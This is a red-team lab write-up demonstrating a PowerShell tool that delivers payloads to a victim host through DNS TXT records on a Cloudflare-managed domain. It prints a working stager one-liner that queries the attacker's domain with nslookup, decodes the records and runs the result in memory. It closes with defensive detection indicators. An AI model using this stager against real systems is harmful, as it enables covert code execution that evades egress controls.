---
description: >-
  This lab demos a tool or rather a Powershell script I have written to do what
  the title says.
---

# Powershell Payload Delivery via DNS using Invoke-PowerCloud

## Powershell Payload Delivery via DNS using Invoke-PowerCloud

### Credits

Rushing to say that the tool [Invoke-PowerCloud](https://github.com/mantvydasb/powercloud/blob/master/Invoke-PowerCloud.ps1) was heavily inspired by and based on the awesome work that Dominic Chell ([@domchell](https://twitter.com/domchell)) from [MDSec](https://twitter.com/MDSecLabs) had done with [PowerDNS](https://github.com/mdsecactivebreach/PowerDNS) - go follow them and try out the [tool](https://www.mdsec.co.uk/2017/07/powershell-dns-delivery-with-powerdns/) if you have not done it yet.

Not only that, I want to thank Dominic for taking his time to answer some of my questions regarding the PowerDNS, the setup and helping me troubleshoot it as I was having "some" issues getting the payload delivered to the target from the PowerDNS server.

...which eventually led me to Invoke-PowerCloud, so read on.

### What is Invoke-PowerCloud?

[Invoke-PowerCloud](https://github.com/mantvydasb/powercloud/blob/master/Invoke-PowerCloud.ps1) is a script that allows you to deliver a powershell payload using DNS TXT records to a target in an environment that is egress limited to DNS only.

### How is Invoke-PowerCloud different from PowerDNS?

I assume you have read [PowerShell DNS Delivery with PowerDNS](https://www.mdsec.co.uk/2017/07/powershell-dns-delivery-with-powerdns/) which explains how PowerDNS works.

Invoke-PowerCloud works in a similar fashion, except for a couple of key differences, which may simplify the configuration process of your infrastructure to start delivering paylods via DNS.\
\
**With PowerDNS you need:**

* a dedicated linux box with a public IP where you can run PowerDNS, so it can act as a DNS server
* you also need multiple domain names to get the nameservers configured properly

**With Invoke-PowerCloud you need:**

* a cloudflare.com account
* a domain name whose DNS management is transferred to cloudflare

### Cloudflare? eh?

The way the tool works is by performing the following high level steps:

* Take the powershell payload file and base64 encode it
* Divide the payload into chunks of 255 bytes
* Create a DNS zone file with DNS TXT records representing each chunk of the payload data retrieved from the previous step
* Send the generated DNS zone file to cloudflare using their APIs
* Generate two stagers for use with authoritative NS/non-authoritative NS
* Stager can then be executed on the victim system. The stager will recover the base64 chunks from the DNS TXT records and rebuild the original payload
* Stager executes the payload in memory!

{% hint style="info" %}
If you run the tool again to deliver another payload, the previous DNS TXT records will be deleted
{% endhint %}

### Demo

#### One off Configuration

Remember - you need a cloudflare.com account for this to work. Assuming you have that, you need to edit the Invoke-PowerCloud as follows:

1. your cloudflare API key, defined in the variable `$Global:API_KEY`
2. your cloudflare email address, defined in the variable `$Global:EMAIL`

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOtY8taH5WTNBzPkvNP%2F-LOtZPzp1s2XelVa_iP5%2FScreenshot%20from%202018-10-15%2022-11-03.png?alt=media\&token=6cd23c9d-b921-4a81-b3bc-f1ae075e3956)

#### DNS Management

Secondly, you need to move the domain name which you are going to use for payload delivery to cloudflare. In this demo, I will use a domain I own `redteam.me` which is now managed by cloudflare:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOtY8taH5WTNBzPkvNP%2F-LOt_GbcWRiPJeR2aC3T%2FScreenshot%20from%202018-10-15%2022-14-53.png?alt=media\&token=94f6b546-dca4-453c-a828-cbb5abb06ee1)

Let's confirm redteam.me DNS is managed by cloudflare by issuing:

```
host -t ns redteam.me
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOtY8taH5WTNBzPkvNP%2F-LOt_e1e-3RlV4V-iCf6%2FScreenshot%20from%202018-10-15%2022-16-20.png?alt=media\&token=37a0ef96-d6c5-4776-8261-591bf58a4ba3)

#### Payload

Let's create a simple payload file - it will print a red message to the screen and open up a calc.exe:

{% code title="payload.txt" %}
```csharp
Write-host -foregroundcolor red "This is our first payload using Invoke-
PowerCloud. As usual, let's pop the calc.exe"; Start-process calc.exe
```
{% endcode %}

#### Good to Go

We are now good to go - issue the below on your attacking system:

```csharp
PS C:\tools\powercloud> . .\powercloud.ps1; Invoke-PowerCloud -FilePath .\payload.txt -Domain redteam.me -Verbose
```

The script will generate two stagers. One of them is shown here:

{% code title="attacker\@victim" %}
```csharp
$b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.redteam.me")[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOtiUinVpxOcsbm9-3l%2F-LOtiqe_mkkPs73QJs2s%2FScreenshot%20from%202018-10-15%2022-47-26.png?alt=media\&token=74542637-1e69-42fd-ab14-effc90d169eb)

Let's execute the stager on the victim system to get the payload delivered via DNS:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOtiUinVpxOcsbm9-3l%2F-LOtj04bJh3lnE9szBaY%2FScreenshot%20from%202018-10-15%2022-47-12.png?alt=media\&token=6e7d7af5-1c1b-4623-8618-f4a3b2ec73b5)

#### Animated Demo

Everything in action can be seen in the below gif:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOt_uEsw4o26PMGOKck%2F-LOtglRjTv597hklO8L4%2Finvoke-powercloud-demo.gif?alt=media\&token=3596039a-97d2-464e-a016-a8bca9e17c7f)

### Is Invoke-PowerCloud better than PowerDNS?

No. It just works slightly differently, but achieves the same end goal. Also note, that Cloudflare API rate limiting applies.

### Detection

Let's deliver a PowerShell empire payload using DNS and see how the system reacts to this:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOyJgZtOsGBwoIRdjbW%2F-LOyPPPiK48hITH_0AcE%2Fempire-stager-via-dns.gif?alt=media\&token=e90b0f6c-69ff-416a-a104-d0a9955a50c6)

For those wondering about detection possibilities, the following is a list of signs (mix and match) that may qualify the host behaviour as `suspicious` and warrant a further investigation:

* host "suddenly" bursted "many" `DNS TXT` requests to one domain
* DNS queries follow the naming convention of 1, 2, 3, ..., N
* majority of DNS answers contain `TXT Lenght` of `255` (trivial to change/randomize)
* DNS answers are all `TTL = 120` (trivial to change/randomize)
* TXT data in DNS answer has no white spaces (easy to change)
* host suddenly/in a short span of time spawned "many" `nslookup` processes
* has the endpoint changed once the DNS lookups stopped? i.e new processes spawned?

Below is a snippet of the PCAP showing DNS traffic from the above demo - note the TXT Length and the data itself:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOyJgZtOsGBwoIRdjbW%2F-LOyOATFCkJBJORc4IIk%2FScreenshot%20from%202018-10-16%2020-12-57.png?alt=media\&token=85454ec8-9faa-4cac-8dd3-9baebd3db283)

Spike of `nslookup` for a host in a short amount of time:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LOyJgZtOsGBwoIRdjbW%2F-LOyOCmaJK2Fb-auwHbR%2FScreenshot%20from%202018-10-16%2020-17-42.png?alt=media\&token=45e5074b-fa68-4490-9adf-c81621453b50)

Below is a sample PCAP for your inspection:

### Download

You can download or contribute to Invoke-PowerCloud here:

{% embed url="https://github.com/mantvydasb/powercloud" %}

### References

{% embed url="https://github.com/mdsecactivebreach/PowerDNS" %}

{% embed url="https://www.mdsec.co.uk/2017/07/powershell-dns-delivery-with-powerdns/" %}
